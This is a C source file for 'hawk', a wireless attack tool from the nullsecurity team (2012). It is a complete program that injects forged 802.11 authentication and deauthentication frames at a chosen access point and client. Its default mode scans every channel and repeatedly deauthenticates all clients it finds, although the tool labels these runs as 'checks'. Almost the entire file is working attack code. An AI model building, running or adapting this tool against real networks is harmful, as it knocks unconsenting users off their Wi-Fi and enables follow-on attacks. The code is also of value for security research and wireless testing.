/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ team                       *
 *                                                                             *
 * hawk.c                                                                      *
 *                                                                             *
 * DATE                                                                        *
 * 18/09/2012                                                                  *
 *                                                                             *
 * AUTHOR                                                                      *
 * atzeton - http://www.nullsecurity.net/                                      *
 *                                                                             *
 * LICENSE                                                                     *
 * GNU GPLv2, see COPYING                                                      *
 *                                                                             *
 ******************************************************************************/

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/wireless.h>
#include <sys/ioctl.h>
#include <string.h>
#include <inttypes.h>
#include <pcap.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <signal.h>
#include <ctype.h>
#include <pthread.h>
#include <time.h>
#include <errno.h>
#include <getopt.h>
#include <signal.h>

#include "rtap.h"
#include "hawk.h"
#include "packet.h"
#include "iw.h"
#include "list.h"
#include "hwk.h"


pthread_mutex_t seq_mutex = PTHREAD_MUTEX_INITIALIZER;

OPTS_t *opts;

void 
sig_int() 
{
	__NOTE("Ctrl+C pressed, shutting down...");
	
	pcap_close(opts->pcapd);
	
	__EXIT_SUCCESS;
}

int 
check_atoi(int x) 
{
	 if(x < 0) { 
		 __ERROR("invalid integer option"); 
		 __EXIT_FAILURE;
	 }
	 
	 return x;
}


int8_t 
optget(int argc, char** argv) 
{
    int32_t index      = -1;
    struct option * opt = 0;
    int32_t result    = 0;
    
    static const struct option long_options[] = {
        { "help",          no_argument,   0, 0 },
        { "iface",   required_argument,   0, 0 },
        { "channel", required_argument,   0, 0 },
        { "delay",   required_argument,   0, 0 },
        { "scandelay",required_argument,   0, 0 },
        { "version", 	   no_argument,   0, 0 },

        { "bssid",   required_argument,   0, 0 },
        { "client",  required_argument,   0, 0 },
        { "dest",    required_argument,   0, 0 },
        
        { "auth",          no_argument,   0, 0 },
        { "deauth",        no_argument,   0, 0 },
        
        {0,0,0,0} 
    };
    
    while (optind < argc) {
        result = getopt_long(argc, argv, "", long_options, &index);
        
        if (result != 0) {
            __ERROR("getopt failed");
            __EXIT_FAILURE;
        }

        else if( result == 0) {
            opt = (struct option *)&(long_options[index]);
                
            if( strcmp(opt->name,"help") == 0) {
				help();
				__EXIT_SUCCESS;
            }
            else if( strcmp(opt->name,"iface") == 0 ) {
                opts->iface = optarg;
            }
            else if( strcmp(opt->name,"version") == 0 ) {
                printf(VERSION"\n");
                __EXIT_SUCCESS;
            }
            else if( strcmp(opt->name,"auth") == 0 ) {
                opts->mode = AUTH_INJECT;
            }
            else if( strcmp(opt->name,"deauth") == 0 ) {
                opts->mode = DEAUTH_INJECT;
            }
            else if( strcmp(opt->name,"delay") == 0) {
				if( opt->has_arg == required_argument ) {
                    opts->delay = (uint16_t) check_atoi(atoi(optarg));
				}
			}
			 else if( strcmp(opt->name,"channel") == 0) {
				if( opt->has_arg == required_argument ) {
                    opts->channel = (uint8_t) check_atoi(atoi(optarg));
				}
			}
            else if( strcmp(opt->name,"bssid") == 0) {
				if( opt->has_arg == required_argument ) {
                    if( sscanf(
                        optarg,"%02x:%02x:%02x:%02x:%02x:%02x",
                        (uint *)&opts->bssid[0],
                        (uint *)&opts->bssid[1],
                        (uint *)&opts->bssid[2],
                        (uint *)&opts->bssid[3],
                        (uint *)&opts->bssid[4],
                        (uint *)&opts->bssid[5]
						) != 6) {
							__ERROR("sscanf failed");
							__EXIT_FAILURE;
					}
				}
			}
			else if( strcmp(opt->name,"client") == 0 ) {
                if( opt->has_arg == required_argument ) {
                    if( sscanf(
                        optarg,"%02x:%02x:%02x:%02x:%02x:%02x",
                        (uint *)&opts->clmac[0],
                        (uint *)&opts->clmac[1],
                        (uint *)&opts->clmac[2],
                        (uint *)&opts->clmac[3],
                        (uint *)&opts->clmac[4],
                        (uint *)&opts->clmac[5]
                    ) != 6) {
							__ERROR("sscanf failed");
							__EXIT_FAILURE;
                    }
                }
            }
            else if( strcmp(opt->name,"dest") == 0 ) {
                if( opt->has_arg == required_argument ) {
                    if( sscanf(
                        optarg,"%02x:%02x:%02x:%02x:%02x:%02x",
                        (uint *)&opts->dstmac[0],
                        (uint *)&opts->dstmac[1],
                        (uint *)&opts->dstmac[2],
                        (uint *)&opts->dstmac[3],
                        (uint *)&opts->dstmac[4],
                        (uint *)&opts->dstmac[5]
                        ) != 6) {
							__ERROR("sscanf failed");
							__EXIT_FAILURE;
                        }
                }
            }
            else if( strcmp(opt->name,"scandelay") == 0 ) {
                if( opt->has_arg == required_argument ) {
					opts->scandelay = check_atoi(atoi(optarg));
                }
            }  
		}
    }
    
    return(0);
}

void
help()
{
	printf(
	"--help:        help\n"
	"--iface:       specify interface to open\n"
	"--channel:     set channel of the wireless interface\n"
	"--delay:       time between packets (usec)\n"
	"--scandelay:   time between channel hop during scan (sec)\n"
	
	"--bssid:       BSSID of the AP\n"
	"--client:      client's mac address\n"
	"--dest:        destination mac address (not set = bssid)\n"
	
	"(default)      multi deauthentication check\n"
	"--auth:        perform authentication check\n"
	"--deauth:      perform deauthentication check\n"
	);
	
	return;
}



OPTS_t *opts_init()
{	
	return( (OPTS_t *) calloc(1, sizeof(OPTS_t) ) );
}


void *
seq_recv(void *arg)
{
	OPTS_t *opts              = (OPTS_t *)arg;
	
    PACKET_t *pkt             = NULL;
    uint8_t type              = 0;
    
    IEEE80211_FCTRL_t *fctrl  = NULL;
    IEEE80211_BEACON_t *mac   = NULL;
    RADIOTAP_CONTROL_t *rctrl = (RADIOTAP_CONTROL_t *)radiotap_init();    
   
    while(TRUE) 
    {
        pkt = packet_recv(opts->pcapd);
        
        if( radiotap_parse(pkt->data, rctrl) < 0 ) 
        {
			__WARNING("radiotap parsing failed");
			continue;
        }

		if( pkt->len >= radiotap_get_total_length(rctrl) + sizeof(IEEE80211_FCTRL_t) ) {
			fctrl = (IEEE80211_FCTRL_t *)(pkt->data + radiotap_get_total_length(rctrl));
			type = (uint8_t) (fctrl->subtype | fctrl->type<<4 );
			
			if( type == IEEE80211_BEACON && pkt->len >= radiotap_get_total_length(rctrl) + sizeof(IEEE80211_BEACON_t) ) {
				mac = (IEEE80211_BEACON_t *)(pkt->data + radiotap_get_total_length(rctrl));
					
				if( memcmp(mac->bssid,opts->bssid,6) == 0 ) {
					if( pthread_mutex_trylock( &seq_mutex) == 0 ) {
						opts->current_seq = mac->seq >> 4;
					
						pthread_mutex_unlock( &seq_mutex);
					}
				}   
			}
			
			packet_free(pkt);
		}
	}   
}
    

PACKET_t 
*auth_build(uint8_t *dst, uint8_t *src, uint8_t *bssid, uint16_t seq)
{
	IEEE80211_AUTH_t *a = (IEEE80211_AUTH_t *) calloc(1, sizeof(IEEE80211_AUTH_t) );
	
	a->fctrl    = 0x00b0;
	a->duration = 0x0001;
	
	pthread_mutex_lock( &seq_mutex );
	a->seq      = seq << 4;
	pthread_mutex_unlock( &seq_mutex );
	
	a->aalg     = 0x0000;
	a->aseq     = 0x0001;
	a->acode    = 0x0000;
	
	memcpy(a->dst,     dst, 6);
	memcpy(a->src,     src, 6);
	memcpy(a->bssid, bssid, 6);

	PACKET_t *auth = packet_create( (uint8_t *)a, sizeof(IEEE80211_AUTH_t) );
									
	return( auth );
}


int8_t
auth_inject() 
{
	uint32_t i     = 0;
	uint  injected = 0;
	time_t tlast   = 0;
	
	PACKET_t *rtap = NULL;
	PACKET_t *auth = NULL;
	PACKET_t *pkt  = NULL;
	
	while(TRUE) {
		i = 0;
		
		while(i<10) {
			rtap = rtap_build_send();
			auth = auth_build(opts->dstmac, opts->clmac, opts->bssid, opts->current_seq + i );
			
			pkt = packet_melt(2, rtap, auth);
			
			if( packet_inject(opts->pcapd, pkt) > 0 ) {
				injected++;
			}
			
			packet_free(pkt);
			
			usleep(opts->delay);
			
			i++;
		}
		
		if( time(NULL) - tlast > 1) {
			__CLEAR_LINE;
			printf("> status: injected: %u\n", injected);
			tlast = time(NULL);
		}
	}
	
	return(0);
}


PACKET_t
*deauth_build(uint8_t *dst, uint8_t *src, uint8_t *bssid, uint16_t seq)
{
	IEEE80211_DEAUTH_t *da = (IEEE80211_DEAUTH_t *) calloc(1, sizeof(IEEE80211_DEAUTH_t) );
	
	da->fctrl    = 0x00c0;
	da->duration = 0x0001;
	
	pthread_mutex_lock( &seq_mutex );
	da->seq      = seq << 4;
	pthread_mutex_unlock( &seq_mutex );
	
	da->reason   = __RAND_U16 % 5 + 1;
	
	memcpy(da->dst,     dst, 6);
	memcpy(da->src,     src, 6);
	memcpy(da->bssid, bssid, 6);

	PACKET_t *deauth = packet_create( (uint8_t *)da, sizeof(IEEE80211_DEAUTH_t) );
									
	return( deauth );
}


int8_t
deauth_inject() 
{
	uint32_t i        = 0;
	uint injected     = 0;
	time_t tlast      = 0;

	PACKET_t *rtap = NULL;
	PACKET_t *dth  = NULL;
	PACKET_t *pkt  = NULL;
	
	while(TRUE) {
		i = 0;
		while(i<10)
		{
			rtap = rtap_build_send();
			dth = deauth_build(opts->dstmac, opts->clmac, opts->bssid, opts->current_seq + i);
			
			pkt = packet_melt(2, rtap, dth);
			
			if( packet_inject(opts->pcapd, pkt) > 0 ) {
				injected++;
			}
			
			packet_free(pkt);
			
			i++;
		}
		
		usleep(opts->delay);
		
		if( time(NULL) - tlast > 1) {
			__CLEAR_LINE;
			printf("> status: injected: %u\n", injected);
			tlast = time(NULL);
		}
	}
	
	return(0);
}



void *
all_catch_data(void *arg)
{
	OPTS_t *opts                   = (OPTS_t *)arg;
	
    uint8_t type                   = 0;
    uint16_t seq                   = 0;
    
    IEEE80211_FCTRL_t *fctrl       = NULL;
    IEEE80211_DATA_t *data1        = NULL;
    IEEE80211_DATA2_t *data2       = NULL;
    RADIOTAP_CONTROL_t *rctrl      = (RADIOTAP_CONTROL_t *)radiotap_init();
    
    uint8_t *bssid                 = NULL;
    uint8_t *src                   = NULL;
    uint8_t *dst                   = NULL;
    
    bssid_t *bssid2                = NULL;
    bssid_t *l_bssid               = NULL;
    
    
    PACKET_t *pkt = (PACKET_t*)calloc(1, sizeof(PACKET_t));
        
    while( TRUE ) {
		pkt = packet_recv(opts->pcapd);
			
		if( radiotap_parse(pkt->data, rctrl) < 0) {
				__WARNING("rtap parse failed");
		}

		if( pkt->len >= radiotap_get_total_length(rctrl) + sizeof(IEEE80211_FCTRL_t) ) { 
			fctrl = (IEEE80211_FCTRL_t *)(pkt->data + radiotap_get_total_length(rctrl));

			type = (uint8_t)(fctrl->subtype | fctrl->type<<4);
					
			/* DATA packet */
			if( type == IEEE80211_DATA || type == IEEE80211_QOS_DATA) 
			{
				if( fctrl->to_ds == 1) 
				{
					if( pkt->len >= radiotap_get_total_length(rctrl) + sizeof(IEEE80211_FCTRL_t) + sizeof(IEEE80211_DATA_t) ) { 
						data1 = (IEEE80211_DATA_t *)(pkt->data + radiotap_get_total_length(rctrl) + 2);
						
						dst = data1->dst;
						src = data1->src;
						bssid = data1->bssid;
						seq = data1->seq >> 4;
					}
						
				}
				else if( fctrl->from_ds == 1 ) 
				{
					if( pkt->len >= radiotap_get_total_length(rctrl) + sizeof(IEEE80211_FCTRL_t) + sizeof(IEEE80211_DATA2_t) ) { 
						data2 = (IEEE80211_DATA2_t *)(pkt->data + radiotap_get_total_length(rctrl) + 2);
							
						dst = data2->dst;
						src = data2->src;
						bssid = data2->bssid;
						seq = data2->seq >> 4;
					}
				}
					
					
				if( !opts->first_bssid ) 
				{
					l_bssid = calloc(1, sizeof(bssid_t) );
					opts->first_bssid = l_bssid;
					memcpy(l_bssid->bssid, bssid, 6);
					l_bssid->channel = iw_freq2channel(rctrl->rtap.channel);
					l_bssid->lseq = seq;
						
					opts->last_bssid = l_bssid;
				}
					
					
				/* append bssid */
				if( bssid_is_in_list(bssid, opts->first_bssid) == -1) 
				{
					bssid_append(opts, bssid, iw_freq2channel(rctrl->rtap.channel), seq);
				}
					
					
				/* append client */
				bssid2 = opts->first_bssid;
				while(bssid2) {
					if( memcmp(bssid, bssid2->bssid,6) == 0 && bssid_has_client(src,opts) == -1) 
					{
						bssid_append_client(bssid2, src);	
					}
							
					bssid2 = bssid2->next;
				}
					
					
				/* append dst if not BROADCAST*/
				if( memcmp(dst,MAC_BROADCAST_ADDR,6) != 0) { 
					bssid2 = opts->first_bssid;
					while(bssid2) {
						if( memcmp(bssid, bssid2->bssid,6) == 0 && bssid_has_client(dst,opts) == -1) {
							bssid_append_dst(bssid2, dst);
								
						}
								
						bssid2 = bssid2->next;
					}
				}
			}
		}
		
        usleep(1);
    }
    
    free(rctrl);

	return(0);
}


void
all_deauth()
{
	uint16_t i       = 0;
	bssid_t *bssid   = NULL;
    client_t *cli    = NULL;
    
    PACKET_t *rtap   = NULL;
	PACKET_t *dth    = NULL;
	PACKET_t *pkt    = NULL;
    
    time_t tstart    = time(NULL);
	

    while (time(NULL) - tstart < 60) {
        bssid = opts->first_bssid;
        cli   = NULL;
        
        while(bssid) {
            iw_set_channel(opts->iface, bssid->channel);
            
            cli = bssid->first_client;
            
            while(cli) {
				for(i=0; i < 10; i++)
				{
					rtap = (PACKET_t *)rtap_build_send();
					dth = deauth_build(bssid->bssid, cli->addr, bssid->bssid, bssid->lseq + i);
					pkt = packet_melt(2, rtap, dth);
					
					packet_inject(opts->pcapd, pkt);
				}
                
                cli = cli->next;
                
            }
            bssid = bssid->next;
        }
        
        usleep(opts->delay);
    }
    
	return;
}


int8_t
deauth_check_all()
{
	bssid_t *bssid  = NULL;
	uint8_t ch      = 0;
	
	pthread_t thrd;
    
    
    while (TRUE) {
		printf("> rescanning... \n");
		
		if( opts->channel == 0)
		{
			for(ch = 1; ch < 15; ch++) 
			{
				printf("> waiting for datas... channel %d\n",ch);
				
				if( iw_set_channel(opts->iface, ch) < 0 )
				{
					__WARNING("setting channel failed\n");
				}
				else {
					pthread_create(&thrd, NULL, all_catch_data, (void *)opts);
					sleep(opts->scandelay);
					pthread_cancel(thrd);
				}
				
				__CLEAR_LINE;
				
			}
			
		}
		else 
		{
			printf("> waiting for datas... channel %d\n",opts->channel);
			iw_set_channel(opts->iface, opts->channel);
			
			pthread_create(&thrd, NULL, all_catch_data, (void *)opts);
			sleep(opts->scandelay);
			pthread_cancel(thrd);
			
		}

		if( bssid_count_elem(opts, bssid) == 0) 
		{
			__ERROR("no connections detected, waiting 10s...\n");
			sleep(10);
		}
		else {
			bssid_print(opts);
		
			printf("> starting injection...\n");
			all_deauth(opts);
		}
	}
    
	return(0);
}


pthread_t
seq_start_thread()
{
	pthread_t seq;
	
	if( pthread_create(&seq, NULL, seq_recv, (void *)opts) != 0 ) 
	{
		__WARNING("seq analyzer thread could not be started");
	}
	
	return(seq);
}


void
seq_cancel_thread(pthread_t trd)
{
	pthread_cancel(trd);
	
	return;
}


void
opts_check()
{
	if( !opts->iface )
	{
		opts->iface = "wlan0";
	}
	
	if( opts->mode == AUTH_INJECT || opts->mode == DEAUTH_INJECT)
	{
		__REQUIRED_BSSID;
		__REQUIRED_CLMAC;
		
		if( memcmp(opts->dstmac,MAC_ZERO_ADDR,6) == 0)
		{
			__NOTE("using destination MAC as BSSID");
			memcpy(opts->dstmac, opts->bssid, 6);
		}
	}
	
	if( opts->delay == 0 ) 
	{
		opts->delay = 5;
	}
	
	if( opts->scandelay == 0 ) 
	{
		opts->scandelay = 3;
	}

	return;
}


pcap_t *
open_interface(char *iface, char *pcap_errbuf) 
{
	pcap_t *p = pcap_create(iface, pcap_errbuf);
	
	if(p == NULL) 
	{
        __ERROR("opening interface failed");
        __EXIT_FAILURE;
    }
    
    /* enable promisc mode */
	pcap_set_promisc(p, 1);
    
    
    /* enable monitor mode */
    if(pcap_can_set_rfmon(p) == 1) 
    { 
		/* not yet set */
		if( pcap_datalink(p) != 127) {
			if( pcap_set_rfmon(p, 1) != 0) 
			{
				__ERROR("monitor mode can't be enabled");
				__EXIT_FAILURE;
			}
		}
	}
	else 
	{
		__ERROR("monitor mode isn't available on interface");
        __EXIT_FAILURE;
	}
	
	int status = pcap_activate(p);
	
	if (!(status == 0 || status == PCAP_WARNING_PROMISC_NOTSUP)) {
		__ERROR("opening interface failed");
        __EXIT_FAILURE;
	}

    return(p);
}


int main(int argc, char **argv)
{   
	opts = opts_init();
	
	if( optget(argc, argv) < 0) {
        __ERROR("getopt failed");
        __EXIT_FAILURE;
    }
    
    __BANNER;
    signal(SIGINT, sig_int);
    
    opts_check();
   
	printf("> opening %s (monitor mode)\n",opts->iface);
	opts->pcapd = open_interface(opts->iface, opts->pcap_errbuf);

	
	if( opts->mode == AUTH_INJECT) 
	{
		__NOTE("starting single authentication check...");
		seq_start_thread();
		
		auth_inject();
	}	
	else if( opts->mode == DEAUTH_INJECT)
	{
		__NOTE("starting single deauthentication check...");
		seq_start_thread();
		
		deauth_inject();
	}
	else 
	{
		__NOTE("starting environment deauthentication check...");
		
		deauth_check_all();
	}
	
	return 0;

}


